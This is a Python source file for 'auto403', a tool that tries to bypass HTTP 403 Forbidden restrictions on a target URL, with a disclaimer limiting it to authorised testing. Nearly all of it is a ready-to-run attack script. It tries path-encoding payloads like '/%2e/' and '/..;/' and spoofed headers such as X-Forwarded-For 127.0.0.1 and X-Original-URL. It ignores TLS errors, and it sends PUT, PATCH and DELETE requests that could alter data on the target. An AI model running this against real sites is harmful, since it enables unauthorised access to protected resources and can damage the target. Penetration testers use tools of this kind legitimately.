#! /usr/bin/python3
# auto403 v0.1
# Automated 403 Forbidden Bypass Testing Tool
# By Mohamed Elsayed
# 
# Features:
#   - HTTP Method & Path testing
#   - Header-based 403 bypass
#   - Proxy support
#   - Simple & Clear Output
# 
# Disclaimer:
#    This tool is intended for educational purposes and authorized
#    security testing only, such as Bug Bounty programs where you
#    have explicit permission to test the target.
#    Unauthorized use against websites or systems without consent
#    is illegal and strictly prohibited.


import requests
import urllib3
from urllib.parse import urlparse
from colorama import Fore, Style, init

# Disable SSL warnings
urllib3.disable_warnings()
init(autoreset=True)

BANNER = f"""
{Style.BRIGHT}{Fore.RED}
 █████╗ ██╗   ██╗████████╗ ██████╗     ██╗  ██╗ ██████╗ ██████╗ 
██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗    ██║  ██║██╔═████╗╚════██╗
███████║██║   ██║   ██║   ██║   ██║    ███████║██║██╔██║ █████╔╝
██╔══██║██║   ██║   ██║   ██║   ██║    ╚════██║████╔╝██║ ╚═══██╗
██║  ██║╚██████╔╝   ██║   ╚██████╔╝         ██║╚██████╔╝██████╔╝
╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝          ╚═╝ ╚═════╝ ╚═════╝ v0.1
{Fore.YELLOW}
        Automated 403 Forbidden Bypass Testing Tool
{Fore.CYAN}
                * Supports Proxies Burp/ZAP
{Fore.WHITE}
          # Coded By Mohamed Elsayed - 0xkalil
{Style.RESET_ALL}"""

BASE_HEADERS = {
    "Accept-Encoding": "gzip, deflate",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Cache-Control": "max-age=1000",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
}


PATH_PAYLOADS = [
    "",
    "/",
    "/.",
    "//",
    "/%2e",
    "/%2f",
    "/./",
    "/..;/",
    "/%2e/",
    "/%252e/",
]


def build_header_payloads(path):
    return [
        {},
        {"X-Host": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Original-URL": path},
        {"X-Rewrite-URL": path},
        {"Referer": path},
        {"Referer": "https://google.com"},
        {"Forwarded": "for=127.0.0.1"},
        {"X-Forwarded-Proto": "https"},
    ]

allowed_methods = []

# Test allowed HTTP methods
def method_tester(url):
    print(f"{Fore.YELLOW}\n[i] Testing allowed HTTP methods...{Style.RESET_ALL}")
    for method in ["GET", "POST", "HEAD", "PUT", "PATCH", "DELETE"]:
        try:
            r = requests.request(
                method=method,
                url=url,
                headers=BASE_HEADERS,
                timeout=5,
                allow_redirects=True,
                verify=False
            )
            if r.status_code != 405:
                allowed_methods.append(method)
                print(f"{Fore.GREEN}[+] {method} allowed (Status: {r.status_code}){Style.RESET_ALL}")
        except requests.RequestException:
            print(f"{Fore.RED}[-] {method} request failed{Style.RESET_ALL}")

# Merge headers
def merge_headers(base, payload):
    headers = base.copy()
    headers.update(payload)
    return headers

# Main bypass logic
def bypass_403(url, proxies=None):
    all_reqs = 0
    success_reqs = 0

    parsed = urlparse(url)
    original_path = parsed.path if parsed.path else "/"

    try:
        baseline_len = len(requests.get(url, verify=False).content)

        for path in PATH_PAYLOADS:
            test_url = url.rstrip("/") + path
            for method in allowed_methods:
                for payload in build_header_payloads(original_path):
                    headers = merge_headers(BASE_HEADERS, payload)
                    try:
                        r = requests.request(
                            method=method,
                            url=test_url,
                            headers=headers,
                            timeout=5,
                            allow_redirects=True,
                            proxies=proxies,
                            verify=False
                        )

                        all_reqs += 1

                        if r.status_code < 300 and abs(len(r.content) - baseline_len) > 50:
                            print(f"                    \n{Style.BRIGHT}{Fore.GREEN}[ BYPASS FOUND ]{Style.RESET_ALL}")
                            print(f"{Fore.WHITE}URL     : {test_url}  =>  {r.url}")
                            print(f"Method  : {Fore.YELLOW}{method}{Style.RESET_ALL}")
                            print(f"Headers : {payload}")
                            print(f"Status  : {Fore.GREEN}{r.status_code}{Style.RESET_ALL}")
                            print(f"Length  : {len(r.content)}")
                            success_reqs += 1
                        else:
                            print(
                                f"{Fore.CYAN}[>] Requests: {all_reqs}{Style.RESET_ALL}",
                                end="\r"
                            )

                    except requests.RequestException:
                        print(f"{Fore.RED}[-] Request Failed{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[>] Total Requests: {all_reqs} | Successful Bypasses: {success_reqs}{Style.RESET_ALL}")

    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Program Interrupted{Style.RESET_ALL}")

# Main
if __name__ == "__main__":
    print(BANNER)

    target = input(f"{Fore.WHITE}[?] Enter forbidden URL: {Style.RESET_ALL}").strip()
    if not target or "http" not in target:
        print(f"{Fore.RED}[X] Invalid URL.")
        exit()
    proxy_input = input(f"{Fore.WHITE}[?] Enter proxy (ip:port) or leave empty: {Style.RESET_ALL}").strip()

    proxies = None
    if proxy_input:
        proxies = {
            "http": f"http://{proxy_input}",
            "https": f"http://{proxy_input}",
        }
        print(f"{Fore.YELLOW}[i] Proxy Enabled: {proxy_input}{Style.RESET_ALL}")

    method_tester(target)
    bypass_403(target, proxies)
